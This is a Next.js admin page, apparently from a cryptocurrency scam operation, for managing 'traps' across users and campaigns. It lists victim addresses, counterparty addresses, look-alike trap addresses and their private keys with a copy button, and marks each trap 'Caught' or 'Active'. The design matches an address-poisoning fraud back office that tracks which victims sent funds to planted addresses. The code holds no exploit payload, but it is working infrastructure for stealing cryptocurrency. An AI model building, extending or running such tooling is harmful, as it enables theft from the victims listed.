// app/admin/traps/page.tsx
'use client';

import { useEffect, useState } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { useRouter } from 'next/navigation';
import { RefreshCw, Copy, Check, Trash2, Users, ArrowLeft } from 'lucide-react';

interface UserSummary {
  id: string;
  email: string;
  trapCount: number;
}

interface Trap {
  id: string;
  victim_address: string;
  counterparty_address: string | null;
  trap_address: string;
  private_key: string | null;
  is_caught: boolean;
  created_at: string;
  campaign_id: string;
  campaigns: {
    user_id: string;
    chain: string;
  };
}

export default function AdminTrapsPage() {
  const router = useRouter();
  const [users, setUsers] = useState<UserSummary[]>([]);
  const [selectedUserId, setSelectedUserId] = useState<string | null>(null);
  const [traps, setTraps] = useState<Trap[]>([]);
  const [loadingUsers, setLoadingUsers] = useState(true);
  const [loadingTraps, setLoadingTraps] = useState(false);
  const [error, setError] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [deletingId, setDeletingId] = useState<string | null>(null);

  const fetchUsers = async () => {
    setLoadingUsers(true);
    try {
      const res = await fetch('/api/admin/traps?includeUsers=true');
      if (!res.ok) {
        if (res.status === 403) {
          router.push('/dashboard');
          return;
        }
        const err = await res.json();
        setError(err.error || 'Failed to fetch users');
        setLoadingUsers(false);
        return;
      }
      const data = await res.json();
      setUsers(data.users || []);
    } catch (err) {
      console.error(err);
      setError('Network error');
    } finally {
      setLoadingUsers(false);
    }
  };

  const fetchTrapsForUser = async (userId: string) => {
    setLoadingTraps(true);
    setSelectedUserId(userId);
    try {
      const res = await fetch(`/api/admin/traps?userId=${userId}`);
      if (!res.ok) {
        const err = await res.json();
        setError(err.error || 'Failed to fetch traps');
        setLoadingTraps(false);
        return;
      }
      const data = await res.json();
      setTraps(data.traps || []);
    } catch (err) {
      console.error(err);
      setError('Network error');
    } finally {
      setLoadingTraps(false);
    }
  };

  useEffect(() => {
    const checkAdmin = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        router.push('/login');
        return;
      }
      const { data: userData } = await supabase
        .from('users')
        .select('role')
        .eq('id', session.user.id)
        .single();
      if (userData?.role !== 'admin') {
        router.push('/dashboard');
        return;
      }
      await fetchUsers();
    };
    checkAdmin();
  }, [router]);

  const handleUserClick = (userId: string) => {
    if (selectedUserId === userId) {
      setSelectedUserId(null);
      setTraps([]);
    } else {
      fetchTrapsForUser(userId);
    }
  };

  const handleBack = () => {
    setSelectedUserId(null);
    setTraps([]);
  };

  const handleRefresh = () => {
    if (selectedUserId) {
      fetchTrapsForUser(selectedUserId);
    } else {
      fetchUsers();
    }
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 3000);
  };

  const deleteTrap = async (trapId: string) => {
    if (!confirm('Are you sure you want to delete this trap? This action cannot be undone.')) return;
    setDeletingId(trapId);
    try {
      const res = await fetch(`/api/admin/traps/${trapId}`, { method: 'DELETE' });
      if (!res.ok) {
        const err = await res.json();
        alert(`Error: ${err.error || 'Failed to delete'}`);
        return;
      }
      setTraps(traps.filter(t => t.id !== trapId));
    } catch (err) {
      alert('Network error');
    } finally {
      setDeletingId(null);
    }
  };

  if (loadingUsers) {
    return <div className="min-h-screen flex items-center justify-center text-gray-300">Loading users...</div>;
  }
  if (error) {
    return <div className="min-h-screen flex items-center justify-center text-red-400">{error}</div>;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center gap-3 mb-6">
          {selectedUserId ? (
            <button
              onClick={handleBack}
              className="flex items-center gap-1 text-gray-400 hover:text-white transition-colors"
            >
              <ArrowLeft size={18} />
              Back
            </button>
          ) : (
            <Users size={24} className="text-blue-400" />
          )}
          <h1 className="text-2xl font-bold text-white">
            {selectedUserId ? 'Traps for User' : 'Admin – Traps Management'}
          </h1>
          <button
            onClick={handleRefresh}
            disabled={loadingTraps || loadingUsers}
            className="ml-auto flex items-center gap-2 px-3 py-1.5 bg-gray-700/50 text-gray-300 rounded-lg hover:bg-gray-600/50 transition-colors disabled:opacity-50"
          >
            <RefreshCw size={14} className={(loadingTraps || loadingUsers) ? 'animate-spin' : ''} />
            Refresh
          </button>
        </div>

        {!selectedUserId ? (
          // ─── User List ───
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
            {users.map((user) => (
              <div
                key={user.id}
                onClick={() => handleUserClick(user.id)}
                className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-2xl p-4 hover:border-blue-500/50 cursor-pointer transition-all hover:shadow-lg hover:shadow-blue-500/5"
              >
                <div className="flex items-center justify-between">
                  <div className="truncate mr-2">
                    <p className="text-white font-medium truncate">{user.email}</p>
                    <p className="text-gray-400 text-sm">Traps: {user.trapCount}</p>
                  </div>
                  <span className="text-blue-400 text-sm font-medium">→</span>
                </div>
              </div>
            ))}
            {users.length === 0 && (
              <div className="col-span-full text-center py-8 text-gray-400">No users with traps found.</div>
            )}
          </div>
        ) : (
          // ─── Traps Table for Selected User ───
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl border border-gray-700 shadow-2xl overflow-hidden">
            {loadingTraps ? (
              <div className="flex items-center justify-center py-8 text-gray-400">Loading traps...</div>
            ) : traps.length === 0 ? (
              <div className="py-8 text-center text-gray-400">No traps found for this user.</div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-sm">
                  <thead className="bg-gray-900/50 border-b border-gray-700">
                    <tr>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Victim</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Counterparty</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Trap Address</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Private Key</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Chain</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Status</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-700">
                    {traps.map((trap) => (
                      <tr key={trap.id} className="hover:bg-gray-700/20 transition-colors">
                        <td className="px-4 py-3 text-gray-300 font-mono text-xs">
                          {trap.victim_address.slice(0, 10)}…{trap.victim_address.slice(-8)}
                        </td>
                        <td className="px-4 py-3 text-gray-400 font-mono text-xs">
                          {trap.counterparty_address ? (
                            <>
                              {trap.counterparty_address.slice(0, 10)}…{trap.counterparty_address.slice(-8)}
                            </>
                          ) : '—'}
                        </td>
                        <td className="px-4 py-3 text-gray-400 font-mono text-xs">
                          {trap.trap_address.slice(0, 10)}…{trap.trap_address.slice(-8)}
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <span className="text-gray-400 font-mono text-xs truncate max-w-[120px]">
                              {trap.private_key ? trap.private_key.slice(0, 10) + '…' : 'N/A'}
                            </span>
                            {trap.private_key && (
                              <button
                                onClick={() => copyToClipboard(trap.private_key!, trap.id)}
                                className="text-gray-400 hover:text-white transition-colors"
                                title="Copy private key"
                              >
                                {copiedId === trap.id ? (
                                  <Check size={14} className="text-green-400" />
                                ) : (
                                  <Copy size={14} />
                                )}
                              </button>
                            )}
                          </div>
                        </td>
                        <td className="px-4 py-3 text-gray-300">
                          {trap.campaigns?.chain || '—'}
                        </td>
                        <td className="px-4 py-3">
                          <span
                            className={`px-2 py-0.5 rounded-full text-xs ${trap.is_caught
                              ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                              : 'bg-green-500/20 text-green-400 border border-green-500/30'
                              }`}
                          >
                            {trap.is_caught ? 'Caught' : 'Active'}
                          </span>
                        </td>
                        <td className="px-4 py-3">
                          <button
                            onClick={() => deleteTrap(trap.id)}
                            disabled={deletingId === trap.id}
                            className="text-red-400 hover:text-red-300 transition-colors disabled:opacity-50"
                            title="Delete trap"
                          >
                            <Trash2 size={16} />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}